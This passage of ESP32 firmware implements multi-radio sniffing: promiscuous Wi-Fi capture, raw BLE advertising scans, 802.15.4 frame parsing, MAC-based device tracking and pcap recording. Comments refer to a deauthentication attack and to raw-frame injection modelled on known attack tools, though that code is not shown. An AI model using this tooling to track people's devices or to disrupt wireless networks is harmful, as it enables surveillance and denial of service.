    const uint32_t now = millis();
    const bool isBeacon = (fc0 == 0x80) || (fc0 == 0x50);   // beacon / probe response
    portENTER_CRITICAL_ISR(&g_devMux);
    const int i = devFindSlot(wifiDevs, kWifiDevSlots, mac);
    WifiDev& d = wifiDevs[i];
    const bool fresh = (d.lastMs == 0 || !macEq(d.mac, mac));
    if (destOnly && fresh && d.lastMs != 0 && !(d.flags & 4)) {
        portEXIT_CRITICAL_ISR(&g_devMux);   // slot holds a real transmitter: a tier-1 hit does not evict it
        return;
    }
    if (fresh) {
        memset(&d, 0, sizeof(d));
        memcpy(d.mac, mac, 6);
        d.maxRssi = rssi;
        d.surv = survLookup(mac);
        if (destOnly) d.flags |= 4;
    }
    if (!destOnly) d.flags &= ~4;   // heard it transmit: upgrade to tier 2
    if (destOnly) {
        if (d.frames < 65535) d.frames++;
        d.lastMs = now;
        portEXIT_CRITICAL_ISR(&g_devMux);
        return;                      // no rssi/ch/IE updates: none of that is this device's
    }
    d.rssi = rssi;
    if (rssi > d.maxRssi) d.maxRssi = rssi;
    if (d.frames < 65535) d.frames++;
    d.lastMs = now;
    d.ch = currentChannelNum;
    if (isBeacon) {
        d.flags |= 1;
        // Full IE parse on the first beacon, then every 16th (BSS load changes over time)
        if (!(d.flags & 2) || (d.beacons & 0x0F) == 0) parseBeaconIes(d, payload, sigLen);
        d.beacons++;
    }
    if (huntActive && macEq(huntMac, mac)) {
        huntRssi = rssi;
        huntLastMs = now;
        huntCount = huntCount + 1;
    }
    portEXIT_CRITICAL_ISR(&g_devMux);
}

void IRAM_ATTR promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA && type != WIFI_PKT_CTRL) return;
    const wifi_promiscuous_pkt_t* pkt = reinterpret_cast<const wifi_promiscuous_pkt_t*>(buf);
    if (pkt->rx_ctrl.rx_state != 0) return;  // CRC/PHY error: not real airtime we can attribute
    const uint16_t sigLen = pkt->rx_ctrl.sig_len;
    const uint16_t minLen = (type == WIFI_PKT_CTRL) ? 10 : 24;
    if (sigLen < minLen) return; // malformed
    const bool hasAddr2 = sigLen >= 16;
    const wifi_ieee80211_packet_t* ipkt = reinterpret_cast<const wifi_ieee80211_packet_t*>(pkt->payload);

    portENTER_CRITICAL_ISR(&g_accumMux);
    g_accum.frames += 1;
    g_accum.bytes += sigLen;
    if (pkt->rx_ctrl.rssi >= kStrongThresholdDbm) {
        g_accum.strong += 1;
    }
    if (hasAddr2) {
        const uint8_t* src = ipkt->hdr.addr2;  // Best-effort transmitter
        const uint16_t h = macHash(src);
        bool known = false;
        for (uint8_t i = 0; i < g_accum.macFill; i++) {
            if (g_accum.macHashes[i] == h) { known = true; break; }
        }
        if (!known && g_accum.macFill < kUniqueSlots) {
            const uint8_t slot = g_accum.macFill;
            g_accum.macHashes[slot] = h;
            g_accum.macFill = slot + 1;
            g_accum.unique += 1;
        }
    }
    portEXIT_CRITICAL_ISR(&g_accumMux);

    if (hasAddr2 && type != WIFI_PKT_CTRL) {
        trackWifiDevice(ipkt->hdr.addr2, pkt->rx_ctrl.rssi, pkt->payload[0], pkt->payload, sigLen);
        // Receiver-side sighting: a device that never transmits during our dwell is still named as addr1
        // by whoever talks to it. Unicast only - broadcast/multicast destinations are not devices.
        if (trackAddr1 && !(ipkt->hdr.addr1[0] & 0x01) && !macEq(ipkt->hdr.addr1, ipkt->hdr.addr2))
            trackWifiDevice(ipkt->hdr.addr1, pkt->rx_ctrl.rssi, 0, pkt->payload, sigLen, true);
    }

    if (capActive && capRing) {
        const uint8_t head = capHead;
        const uint8_t next = (head + 1) % capSlots;
        if (next == capTail) {
            capDropped = capDropped + 1;   // consumer too slow: drop, but count it
            return;
        }
        CapFrame& f = capRing[head];
        uint16_t n = sigLen;
        if (n > capSnapLen) n = capSnapLen;
        if (n > kCapMaxLen) n = kCapMaxLen;
        f.ts_us = pkt->rx_ctrl.timestamp;
        f.len = sigLen;
        f.capLen = n;
        f.rssi = pkt->rx_ctrl.rssi;
        f.channel = currentChannelNum;
        memcpy(f.data, pkt->payload, n);
        capHead = next;
    }
}

void resetAccum() {
    portENTER_CRITICAL(&g_accumMux);
    g_accum.frames = 0;
    g_accum.bytes = 0;
    g_accum.strong = 0;
    g_accum.unique = 0;
    g_accum.macFill = 0;
    for (int i = 0; i < kUniqueSlots; i++) g_accum.macHashes[i] = 0;
    portEXIT_CRITICAL(&g_accumMux);
}

// ---------------------------------------------------------------------------------------------
// BLE scanning (runs in the NimBLE host task)
// ---------------------------------------------------------------------------------------------
// Bandwatch drives NimBLE's ble_gap_disc() directly instead of going through the Arduino BLEScan
// wrapper. The wrapper cannot give packet-accurate data: parseAdvertisement() *merges* every payload it
// sees from an address ("handles both ADV and Scan Response packets by merging them"), onResult() fires
// only once a scan response arrives when active scanning, and setAdvType() is recorded only on first
// sight. Driving the GAP API ourselves hands us one callback per on-air advertising report, with its own
// data, address, RSSI and PDU type - which is what a pcap needs. It also removes the library's result
// cache, and with it the heap-floor dance serviceBle() used to need.
const char* bleAdTypeName(uint8_t t);   // fwd

// Advertising-channel access address; the PDU types are BT Core Spec Vol 6 Part B 2.3.
constexpr uint32_t kAdvAccessAddr = 0x8E89BED6;
enum : uint8_t { LL_ADV_IND = 0x0, LL_ADV_DIRECT_IND = 0x1, LL_ADV_NONCONN_IND = 0x2,
                 LL_SCAN_RSP = 0x4, LL_ADV_SCAN_IND = 0x6 };

// HCI advertising-report event types are NOT the same numbers as LL PDU types - map them.
uint8_t llPduTypeFromHci(uint8_t evtype) {
    switch (evtype) {
        case BLE_HCI_ADV_RPT_EVTYPE_ADV_IND:     return LL_ADV_IND;
        case BLE_HCI_ADV_RPT_EVTYPE_DIR_IND:     return LL_ADV_DIRECT_IND;
        case BLE_HCI_ADV_RPT_EVTYPE_SCAN_IND:    return LL_ADV_SCAN_IND;
        case BLE_HCI_ADV_RPT_EVTYPE_NONCONN_IND: return LL_ADV_NONCONN_IND;
        case BLE_HCI_ADV_RPT_EVTYPE_SCAN_RSP:    return LL_SCAN_RSP;
        default:                                 return LL_ADV_IND;
    }
}

// Minimal AD-structure parser: [len][type][data...]. Replaces what BLEAdvertisedDevice used to do for
// us, and unlike the library's version it only ever sees one packet's worth of data.
struct AdInfo {
    char name[21];
    uint16_t company, appearance, svc, svcData;
    int8_t txPower;
    uint8_t appleType;
    bool haveName;
};

void parseAdStructures(const uint8_t* p, uint16_t n, AdInfo& out) {
    memset(&out, 0, sizeof(out));
    out.txPower = 127;
    uint16_t i = 0;
    while (i + 1 < n) {
        const uint8_t len = p[i];
        if (len == 0 || i + 1 + len > n) break;
        const uint8_t type = p[i + 1];
        const uint8_t* v = p + i + 2;
        const uint8_t vlen = len - 1;
        switch (type) {
            case 0x08: case 0x09: {                       // shortened / complete local name
                const uint8_t c = vlen < sizeof(out.name) - 1 ? vlen : sizeof(out.name) - 1;
                memcpy(out.name, v, c); out.name[c] = 0;
                sanitizeText(out.name, c);
                out.haveName = true;
                break;
            }
            case 0x0A: if (vlen >= 1) out.txPower = static_cast<int8_t>(v[0]); break;   // TX power level
            case 0x19: if (vlen >= 2) out.appearance = v[0] | (v[1] << 8); break;       // appearance
            case 0x02: case 0x03:                                                       // 16-bit service UUIDs
                if (vlen >= 2 && !out.svc) out.svc = v[0] | (v[1] << 8);
                break;
            case 0x16:                                                                  // 16-bit service data
                if (vlen >= 2 && !out.svcData) out.svcData = v[0] | (v[1] << 8);
                break;
            case 0xFF:                                                                  // manufacturer specific
                if (vlen >= 2) {
                    out.company = v[0] | (v[1] << 8);
                    if (out.company == 0x004C && vlen >= 3) out.appleType = v[2];
                }
                break;
            default: break;
        }
        i += 1 + len;
    }
}

// Build one LINKTYPE_BLUETOOTH_LE_LL_WITH_PHDR record body (without the 10-byte pseudo-header, which
// sdWriteFrame/the host writer prepend from f.channel and f.rssi, exactly as radiotap is prepended for
// Wi-Fi): access address, LL header, AdvA, [TargetA], AdvData, CRC.
uint16_t buildBleLlFrame(uint8_t* out, const uint8_t* addr, uint8_t addrType, uint8_t pduType,
                         const uint8_t* adv, uint16_t advLen) {
    // The legacy advertising header's length field is 6 bits and covers AdvA + AdvData, so AdvData tops
    // out at 0x3F-6 = 57. Truncate rather than mask: a masked over-long length wraps to a small bogus
    // value and Wireshark then mis-dissects the whole record.
    const bool direct = (pduType == LL_ADV_DIRECT_IND);
    uint16_t payload = direct ? 0 : advLen;
    if (payload > 57) payload = 57;
    uint8_t* p = out;
    putLE32(p, kAdvAccessAddr); p += 4;
    uint8_t hdr0 = pduType & 0x0F;
    if (addrType != BLE_ADDR_PUBLIC) hdr0 |= 0x40;          // TxAdd: AdvA is a random address
    // RxAdd is left clear: the HCI report never carries TargetA's address type, and guessing it would
    // write a fabricated fact into the capture.
    *p++ = hdr0;
    *p++ = static_cast<uint8_t>((6 + (direct ? 6 : 0) + payload) & 0x3F);
    memcpy(p, addr, 6); p += 6;                              // AdvA, little-endian on air
    if (direct) { memset(p, 0, 6); p += 6; }                 // TargetA is not surfaced: zeroed, but present
    if (payload) { memcpy(p, adv, payload); p += payload; }
    *p++ = 0; *p++ = 0; *p++ = 0;                            // CRC we do not have (flags say "not checked")
    return static_cast<uint16_t>(p - out);
}

void trackBleDevice(const uint8_t* mac, int8_t rssi, uint8_t addrType, const AdInfo& ad, uint8_t bflags) {
    const uint32_t now = millis();
    bool isNew = false;
    portENTER_CRITICAL(&g_devMux);
    const int i = devFindSlot(bleDevs, kBleDevSlots, mac);
    BleDev& d = bleDevs[i];
    if (d.lastMs == 0 || !macEq(d.mac, mac)) {
        memset(&d, 0, sizeof(d));
        memcpy(d.mac, mac, 6);
        d.maxRssi = rssi;
        d.txPower = 127;
        d.surv = survLookup(mac);
        isNew = true;
    }
    d.rssi = rssi;
    if (rssi > d.maxRssi) d.maxRssi = rssi;
    if (d.adv < 65535) d.adv++;
    d.lastMs = now;
    d.addrType = addrType;
    if (ad.haveName && ad.name[0]) strncpy(d.name, ad.name, sizeof(d.name));
    if (ad.company) d.company = ad.company;
    if (ad.appleType) d.appleType = ad.appleType;
    if (ad.appearance) d.appearance = ad.appearance;
    if (ad.txPower != 127) d.txPower = ad.txPower;
    if (ad.svc) d.svc = ad.svc;
    if (ad.svcData) d.svcData = ad.svcData;
    d.flags |= bflags;
    if (huntActive && macEq(huntMac, mac)) {
        huntRssi = rssi;
        huntLastMs = now;
        huntCount = huntCount + 1;
    }
    const bool named = d.name[0] != 0;
    portEXIT_CRITICAL(&g_devMux);
    // Only a scannable advertiser can answer a SCAN_REQ, so asking for an active window for anything else
    // would transmit for nothing. Flag only; the actual switch happens in serviceBle() on the loop task,
    // because restarting discovery from inside the GAP callback would re-enter the host.
    if (isNew && !named && (bflags & 4)) bleActiveUntilMs = now + kBleActiveWindowMs;
}

// One on-air advertising report. Runs in the NimBLE host task.
int bleGapEvent(struct ble_gap_event* event, void* arg) {
    (void)arg;
    if (event->type == BLE_GAP_EVENT_DISC) {
        const struct ble_gap_disc_desc& d = event->disc;
        const int8_t rssi = static_cast<int8_t>(d.rssi);
        AdInfo ad;
        parseAdStructures(d.data, d.length_data, ad);
        const uint8_t pdu = llPduTypeFromHci(d.event_type);
        const uint8_t bflags = ((pdu == LL_ADV_IND || pdu == LL_ADV_DIRECT_IND) ? 1 : 0)   // connectable
                             | 2                                                            // legacy adv
                             | ((pdu == LL_ADV_IND || pdu == LL_ADV_SCAN_IND) ? 4 : 0);     // scannable
        // ble_addr_t.val is little-endian (as it goes on air). Everything that displays or keys on a MAC
        // - the device table, the LCD, the dashboard, OUI lookup, the randomized-address bit, hunt
        // matching - expects the conventional MSB-first order, so reverse it here. The pcap builder below
        // deliberately keeps the raw little-endian bytes, because that is what the wire format wants.
        uint8_t mac[6];
        for (int i = 0; i < 6; i++) mac[i] = d.addr.val[5 - i];
        trackBleDevice(mac, rssi, d.addr.type, ad, bflags);
        bleAdvSeen = bleAdvSeen + 1;

        if (capActive && capRing) {                 // same single-producer discipline as the Wi-Fi path
            const uint8_t head = capHead;
            const uint8_t next = (head + 1) % capSlots;
            if (next == capTail) {
                capDropped = capDropped + 1;
            } else {
                CapFrame& f = capRing[head];
                const uint16_t n = buildBleLlFrame(f.data, d.addr.val, d.addr.type, pdu,
                                                   d.data, d.length_data);
                f.ts_us = micros();
                f.len = n;
                f.capLen = n > capSnapLen ? capSnapLen : n;
                f.rssi = rssi;
                f.channel = 39;   // the HCI report does not say which of 37/38/39 it arrived on
                capHead = next;
            }
        }
    } else if (event->type == BLE_GAP_EVENT_DISC_COMPLETE) {
        bleScanDone = true;
    }
    return 0;
}

void startBle() {
    if (!bleInited) {
        BLEDevice::init("bandwatch");   // brings up the NimBLE host; we drive discovery ourselves
        bleInited = true;
    }
    struct ble_gap_disc_params p = {};
    p.itvl = 160;            // 100 ms in 0.625 ms units
    p.window = 128;          // 80 ms
    p.passive = bleActiveScan ? 0 : 1;   // bleActiveScan = what we decided to run
    p.filter_duplicates = 0; // every advertisement, not just the first from each address
    p.limited = 0;
    bleScanDone = false;
    const int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, BLE_HS_FOREVER, &p, bleGapEvent, nullptr);
    if (rc != 0 && rc != BLE_HS_EALREADY && serialRoom(120))
        Serial.printf("{\"t\":\"err\",\"msg\":\"ble_gap_disc failed rc=%d\"}\n", rc);
}

void stopBle() {
    if (!bleInited) return;
    ble_gap_disc_cancel();
    BLEDevice::deinit(false);   // keep controller memory so BLE can be re-initialised later
    bleInited = false;
}

// Discovery runs continuously (BLE_HS_FOREVER) and keeps no result cache, so there is nothing to recycle.
// This restarts it if the host ever ends discovery, and applies the passive/active policy.
void serviceBle() {
    if (bandMode != BAND_BLE || !bleInited) return;
    if (bleScanDone) {
        bleScanCycles++;
        bleScanDone = false;
        startBle();
        return;
    }
    // A capture must not be half passive and half active: whatever is running when recording starts stays.
    if (capActive) return;
    bool want = bleActiveScan;
    switch (bleScanMode) {
        case BLE_SCAN_PASSIVE: want = false; break;
        case BLE_SCAN_ACTIVE:  want = true;  break;
        case BLE_SCAN_AUTO:    want = static_cast<int32_t>(bleActiveUntilMs - millis()) > 0; break;
    }
    if (want == bleActiveScan) return;
    const uint32_t now = millis();
    if (now - bleLastSwitchMs < kBleSwitchMinMs) return;   // rate limit: restarting discovery costs a gap
    bleLastSwitchMs = now;
    bleSwitches++;
    bleActiveScan = want;
    ble_gap_disc_cancel();
    startBle();
}

// ---------------------------------------------------------------------------------------------
// IEEE 802.15.4 (Zigbee / Thread) sniffing. The driver's callbacks run in ISR context.
// ---------------------------------------------------------------------------------------------
volatile uint32_t rx154Count = 0;

// Classify the MAC payload: Zigbee NWK header, Zigbee Green Power, or 6LoWPAN (Thread).
inline uint8_t IRAM_ATTR classify154(const uint8_t* pl, uint16_t n, bool macSecured) {
    if (macSecured) return 4;                       // encrypted at MAC level: Thread does this, Zigbee does not
    if (n < 2) return 0;
    const uint8_t b = pl[0];
    if ((b & 0xE0) == 0x60 || (b & 0xF8) == 0xC0 || (b & 0xF8) == 0xE0 || (b & 0xC0) == 0x80 || b == 0x41) return 3; // 6LoWPAN IPHC / FRAG / mesh / IPv6
    const uint8_t ver = (b >> 2) & 0x0F;
    if (ver == 2) return 1;                         // Zigbee (Pro)
    if (ver == 3) return 2;                         // Zigbee Green Power
    return 0;
}

void IRAM_ATTR track154(const uint8_t* key, bool hasExt, uint16_t pan, uint16_t shortAddr, int8_t rssi, uint8_t lqi,
                        uint8_t proto, uint8_t flagBits) {
    const uint32_t now = millis();
    portENTER_CRITICAL_ISR(&g_devMux);
    const int i = dev154FindSlot(devs154, kDev154Slots, key);
    Dev154& d = devs154[i];
    if (d.lastMs == 0 || !key8Eq(d.key, key)) {
        memset(&d, 0, sizeof(d));
        memcpy(d.key, key, 8);
        d.maxRssi = rssi;
        d.shortAddr = 0xFFFF;
        d.pan = 0xFFFF;
    }
    d.rssi = rssi;
    if (rssi > d.maxRssi) d.maxRssi = rssi;
    if (d.frames < 65535) d.frames++;
    d.lastMs = now;
    d.ch = currentChannelNum;
    d.lqi = lqi;
    if (hasExt) d.flags |= 1;
    if (shortAddr != 0xFFFF) d.shortAddr = shortAddr;
    if (pan != 0xFFFF) d.pan = pan;
    if (proto) d.proto = proto;
    d.flags |= flagBits;
    if (huntActive && huntKind == 1 && key8Eq(huntKey, key)) {
        huntRssi = rssi;
        huntLastMs = now;
        huntCount = huntCount + 1;
    }
    portEXIT_CRITICAL_ISR(&g_devMux);
}

} // namespace (the driver callback needs C linkage)

extern "C" void IRAM_ATTR esp_ieee802154_receive_done(uint8_t* frame, esp_ieee802154_frame_info_t* info) {
    // frame[0] = PSDU length incl. the 2 FCS bytes, which the radio replaces with RSSI/LQI.
    const uint16_t len = frame[0];
    const uint8_t* p = frame + 1;
    const int8_t rssi = info->rssi;
    if (len >= 5) {
        const uint16_t n = len - 2;   // MHR + payload, without the pseudo-FCS
        const uint16_t fc = p[0] | (p[1] << 8);
        const uint8_t ftype = fc & 0x07;
        const bool secured = fc & 0x08;
        const bool panComp = fc & 0x40;
        const uint8_t dstMode = (fc >> 10) & 3;
        const uint8_t srcMode = (fc >> 14) & 3;
        const uint8_t ver = (fc >> 12) & 3;
        uint16_t off = 3;   // fc + seq

        portENTER_CRITICAL_ISR(&g_accumMux);
        g_accum.frames += 1;
        g_accum.bytes += n;
        if (rssi >= kStrongThresholdDbm) g_accum.strong += 1;
        portEXIT_CRITICAL_ISR(&g_accumMux);

        uint16_t dstPan = 0xFFFF, srcPan = 0xFFFF, shortAddr = 0xFFFF;
        uint8_t key[8];
        bool haveSrc = false, hasExt = false;
        if (ver <= 1) {
            if (dstMode) { if (off + 2 <= n) { dstPan = p[off] | (p[off + 1] << 8); } off += 2; off += (dstMode == 2) ? 2 : 8; }
            if (srcMode) {
                if (!panComp) { if (off + 2 <= n) srcPan = p[off] | (p[off + 1] << 8); off += 2; }
                else srcPan = dstPan;
                if (srcMode == 2 && off + 2 <= n) {
                    shortAddr = p[off] | (p[off + 1] << 8);
                    key[0] = 0xFF; key[1] = 0xFE; key[2] = srcPan & 0xFF; key[3] = srcPan >> 8;
                    key[4] = shortAddr & 0xFF; key[5] = shortAddr >> 8; key[6] = 0; key[7] = 0;
                    haveSrc = true;
                    off += 2;
                } else if (srcMode == 3 && off + 8 <= n) {
                    for (int i = 0; i < 8; i++) key[i] = p[off + 7 - i];   // big-endian display order
                    haveSrc = hasExt = true;
                    off += 8;
                }
            }
            if (haveSrc) {
                if (secured) {
                    // auxiliary security header: 1 control byte + 4 frame counter + key identifier
                    if (off < n) {
                        const uint8_t sc = p[off];
                        const uint8_t kim = (sc >> 3) & 3;
                        off += 5 + (kim == 0 ? 0 : kim == 1 ? 1 : kim == 2 ? 5 : 9);
                    }
                }
                uint8_t proto = 0, flagBits = 0;
                if (ftype == 0) {                       // beacon
                    flagBits |= 2;
                    if (off + 2 <= n) {
                        const uint16_t sf = p[off] | (p[off + 1] << 8);
                        if (sf & 0x8000) flagBits |= 4;  // association permit
                        uint16_t q = off + 2;
                        if (q < n) { const uint8_t gts = p[q]; q += 1 + ((gts & 7) ? 1 + 3 * (gts & 7) : 0); }
                        if (q < n) { const uint8_t pa = p[q]; q += 1 + 2 * (pa & 7) + 8 * ((pa >> 4) & 7); }
                        if (q < n) {
                            const uint8_t pid = p[q];
                            if (pid == 0x00) proto = 1;      // Zigbee beacon payload (protocol id 0)
                            else if (pid == 0x03) proto = 3; // Thread beacon
                        }
                    }
                } else if (ftype == 1) {                // data
                    flagBits |= 16;
                    if (!secured && off < n) proto = classify154(p + off, n - off, false);
                    else if (secured) { proto = 4; flagBits |= 8; }
                } else if (ftype == 3) {                // MAC command
                    if (secured) flagBits |= 8;
                }
                track154(key, hasExt, srcPan, shortAddr, rssi, info->lqi, proto, flagBits);
            }
        }

        if (capActive && capRing) {
            const uint8_t head = capHead;
            const uint8_t next = (head + 1) % capSlots;
            if (next == capTail) {
                capDropped = capDropped + 1;
            } else {
                CapFrame& f = capRing[head];
                uint16_t c = n;
                if (c > capSnapLen) c = capSnapLen;
                if (c > kCapMaxLen) c = kCapMaxLen;
                f.ts_us = static_cast<uint32_t>(info->timestamp);
                f.len = n;
                f.capLen = c;
                f.rssi = rssi;
                f.channel = currentChannelNum;
                memcpy(f.data, p, c);
                capHead = next;
            }
        }
        rx154Count = rx154Count + 1;
    }
    esp_ieee802154_receive_handle_done(frame);
}

namespace {

void start154() {
    if (r154Running) return;
    esp_ieee802154_enable();
    esp_ieee802154_set_promiscuous(true);
    esp_ieee802154_set_rx_when_idle(true);
    r154Running = true;
}

void stop154() {
    if (!r154Running) return;
    esp_ieee802154_set_rx_when_idle(false);
    esp_ieee802154_sleep();
    esp_ieee802154_disable();
    r154Running = false;
    currentChannelNum = 0;
}

// ---------------------------------------------------------------------------------------------
// Channel control / Wi-Fi lifecycle
// ---------------------------------------------------------------------------------------------
bool applyChannelIdx(int idx) {
    if (is154(idx)) {
        if (!r154Running) return false;
        esp_ieee802154_set_channel(kChannels[idx]);
        esp_ieee802154_receive();
        currentChannelNum = kChannels[idx];
        dwellStartedMs = millis();
        return true;
    }
    const esp_err_t err = esp_wifi_set_channel(kChannels[idx], WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        if (serialRoom(120))
            Serial.printf("{\"t\":\"log\",\"msg\":\"channel %u rejected (%s)%s\"}\n", kChannels[idx],
                          esp_err_to_name(err), err == ESP_ERR_INVALID_ARG ? " - skipping permanently" : " - will retry");
        if (err == ESP_ERR_INVALID_ARG) channels[idx].unavailable = true;
        return false;
    }
    currentChannelNum = kChannels[idx];
    dwellStartedMs = millis();
    return true;
}

bool advanceChannel() {
    if (!(wifiMode() && wifiRunning) && !(mode154() && r154Running)) return false;
    if (parkedIdx >= 0 && chanEnabled(parkedIdx) && !channels[parkedIdx].unavailable) {
        currentIdx = parkedIdx;
        return applyChannelIdx(currentIdx);
    }
    for (int tries = 0; tries < kChannelCount; tries++) {
        currentIdx += 1;
        if (currentIdx >= kChannelCount) currentIdx = 0;
        if (!chanEnabled(currentIdx) || channels[currentIdx].unavailable) continue;
        if (applyChannelIdx(currentIdx)) return true;
    }
    return false;
}

int indexOfChannel(int ch) {   // in the current mode's channel set
    for (int i = 0; i < kChannelCount; i++) if (kChannels[i] == ch && chanEnabled(i)) return i;
    return -1;
}
int indexOfChannel154(int ch) {
    for (int i = 0; i < kChannelCount; i++) if (kChannels[i] == ch && is154(i)) return i;
    return -1;
}

wifi_band_mode_t toDriverBand(BandMode m) {
    return m == BAND_5G ? WIFI_BAND_MODE_5G_ONLY : m == BAND_24G ? WIFI_BAND_MODE_2G_ONLY : WIFI_BAND_MODE_AUTO;
}

void applyProtocols() {
    wifi_protocols_t protos = {};
    // LR in the 2.4 GHz set too, for parity with GhostESP's C5 attack profile (low-rate raw TX).
    protos.ghz_2g = WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AX | WIFI_PROTOCOL_LR;
    protos.ghz_5g = WIFI_PROTOCOL_11A | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AC | WIFI_PROTOCOL_11AX;
    errProto = esp_wifi_set_protocols(WIFI_IF_STA, &protos);
}

void resetChannelStats() {
    for (int i = 0; i < kChannelCount; i++) {
        channels[i].hasData = false;
        channels[i].busyEma = channels[i].busyCurrent = 0.0f;
        channels[i].metrics = ChannelMetrics{};
    }
    sweepCount = 0;
    resetAccum();
}

void startWifi() {
    if (wifiRunning) return;
    WiFi.persistent(false);
    WiFi.mode(WIFI_STA);     // esp_wifi_init + esp_wifi_start
    WiFi.setSleep(false);
    (void)esp_wifi_set_max_tx_power(82);   // explicit TX power for raw injection (like Marauder's attack profile)
    wifi_tx_rate_config_t txcfg = { .phymode = WIFI_PHY_MODE_HT20, .rate = WIFI_PHY_RATE_MCS0_LGI, .ersu = false, .dcm = false };
    (void)esp_wifi_config_80211_tx(WIFI_IF_STA, &txcfg);   // raw mgmt-frame rate: 6 Mbps OFDM, works on both bands

    wifi_country_t country = {};
    memcpy(country.cc, kCountryCode, 2);
    country.cc[2] = 0;
    country.schan = 1;
    country.nchan = 13;
    country.max_tx_power = 20;
    country.policy = WIFI_COUNTRY_POLICY_MANUAL;
    country.wifi_5g_channel_mask = kAll5gChannelMask;
    errCountry = esp_wifi_set_country(&country);

    errBand = esp_wifi_set_band_mode(toDriverBand(bandMode));
    delay(100);
    applyProtocols();

    wifi_promiscuous_filter_t filt{};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_CTRL;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCb);
    errPromisc = esp_wifi_set_promiscuous(true);
    wifiRunning = true;

    resetChannelStats();
    currentIdx = -1;
    monitorReady = advanceChannel();
}

void stopWifi() {
    if (!wifiRunning) return;
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);     // esp_wifi_stop + deinit: frees the driver's RAM for the BLE stack
    wifiRunning = false;
    monitorReady = false;
    currentChannelNum = 0;
}

void stopDeauth();   // defined below with the hunt helpers; a mode change tears the attack down first

// Stop capturing and give the ring back to the heap. Safe from the loop task only: the radio callbacks
// re-read capRing/captureEnabled on every frame and run to completion, so they never hold a stale pointer.
void sdCloseCapture();   // defined with the SD sink below

// Both sinks share one ring; allocate it on first use and keep it until every sink is done.
bool ensureCapRing() {
    if (capRing) return true;
    capDropped = 0; capSent = 0; capHead = 0; capTail = 0;
    const uint32_t freeHeap = ESP.getMaxAllocHeap();
    int slots = (freeHeap > kCapHeapReserve) ? static_cast<int>((freeHeap - kCapHeapReserve) / sizeof(CapFrame)) : 0;
    if (slots > kCapSlotsMax) slots = kCapSlotsMax;
    if (slots >= kCapSlotsMin) {
        capRing = static_cast<CapFrame*>(malloc(sizeof(CapFrame) * slots));
        capSlots = capRing ? slots : 0;
    }
    if (!capRing) {
        if (serialRoom(120))
            Serial.printf("{\"t\":\"err\",\"msg\":\"capture buffer: not enough free heap (%u)\"}\n",
                          static_cast<unsigned>(freeHeap));
        return false;
    }
    if (serialRoom(100)) Serial.printf("{\"t\":\"log\",\"msg\":\"capture ring: %d slots\"}\n", capSlots);
    return true;
}

void releaseCapture();

// Recompute what the RX paths should do, and hand the ring back once no sink wants frames.
void syncCapActive() {
    capActive = captureEnabled || sdCapEnabled;
    if (!capActive) releaseCapture();
}

void releaseCapture() {
    captureEnabled = false;
    sdCloseCapture();
    capActive = false;
    if (!capRing) return;
    CapFrame* r = capRing;
    capRing = nullptr;
    capSlots = 0;
    capHead = 0;      // separate stores: chaining them reads back a volatile, which C++20 deprecates
    capTail = 0;
    free(r);
}

// Switch band mode at runtime: clears per-channel history and restarts the sweep (or swaps radios).
void setBandMode(BandMode m) {
    const BandMode prev = bandMode;
    if (m == prev) return;
    bandMode = m;
    releaseCapture();         // the host restarts a capture if it wants one (link type differs per radio);
                              // the ring must go back to the heap or BLE mode starts ~32 KB short
    stopDeauth();             // the attack is pinned to a channel: unpark, and the host can re-send it
    if (parkedIdx >= 0 && !chanEnabled(parkedIdx)) parkedIdx = -1;
    const bool radioChange = (prev == BAND_BLE) || (prev == BAND_154) || (m == BAND_BLE) || (m == BAND_154);
    if (radioChange) {
        if (prev == BAND_BLE) stopBle();
        else if (prev == BAND_154) stop154();
        else stopWifi();
        if (m == BAND_BLE) { startBle(); return; }
        if (m == BAND_154) {
            start154();
            resetChannelStats();
            currentIdx = -1;
            monitorReady = advanceChannel();
            return;
        }
        startWifi();
        return;
    }
    errBand = esp_wifi_set_band_mode(toDriverBand(m));
    delay(100);
    applyProtocols();
    resetChannelStats();
    currentIdx = -1;
    monitorReady = advanceChannel();
}

// ---------------------------------------------------------------------------------------------
// Scoring
// ---------------------------------------------------------------------------------------------
float computeBusyScore(const ChannelMetrics& m) {
    const float dwellSec = static_cast<float>(kDwellMs) / 1000.0f;
    const float pps = m.frames / dwellSec;
    const float bps = m.bytes / dwellSec;
    const float strongRatio = (m.frames > 0) ? (static_cast<float>(m.strong) / static_cast<float>(m.frames)) : 0.0f;
    const float ppsRef = mode154() ? 120.0f : 600.0f;      // 802.15.4 is a 250 kbit/s radio
    const float bpsRef = mode154() ? 12000.0f : 50000.0f;
    const float ppsScore = clamp01(log1pf(pps) / logf(ppsRef));
    const float bpsScore = clamp01(log1pf(bps) / logf(bpsRef));
    const float uniqueScore = clamp01(log1pf(static_cast<float>(m.unique)) / logf(20.0f));
    const float raw = 0.40f * ppsScore + 0.30f * bpsScore + 0.20f * strongRatio + 0.10f * uniqueScore;
    return clamp01(raw) * 100.0f;
}

float globalActivityMax() {
    float maxVal = 0.0f;
    for (int i = 0; i < kChannelCount; i++) {
        if (chanEnabled(i) && channels[i].hasData && channels[i].busyEma > maxVal) maxVal = channels[i].busyEma;
    }
    return maxVal;
}

void sortTop3(int outIdx[3]) {
    for (int i = 0; i < 3; i++) outIdx[i] = -1;
    for (int i = 0; i < kChannelCount; i++) {
        if (!chanEnabled(i) || !channels[i].hasData) continue;
        for (int pos = 0; pos < 3; pos++) {
            if (outIdx[pos] == -1 || channels[i].busyEma > channels[outIdx[pos]].busyEma) {
                for (int shift = 2; shift > pos; shift--) outIdx[shift] = outIdx[shift - 1];
                outIdx[pos] = i;
                break;
            }
        }
    }
}

// Snapshot helpers for device tables (copy under lock, then sort outside). One shared scratch buffer,
// used from the loop task only (UI timer and host output both run there).
union DevSnap { WifiDev w[kWifiDevSlots]; BleDev b[kBleDevSlots]; Dev154 z[kDev154Slots]; };
DevSnap devSnap;

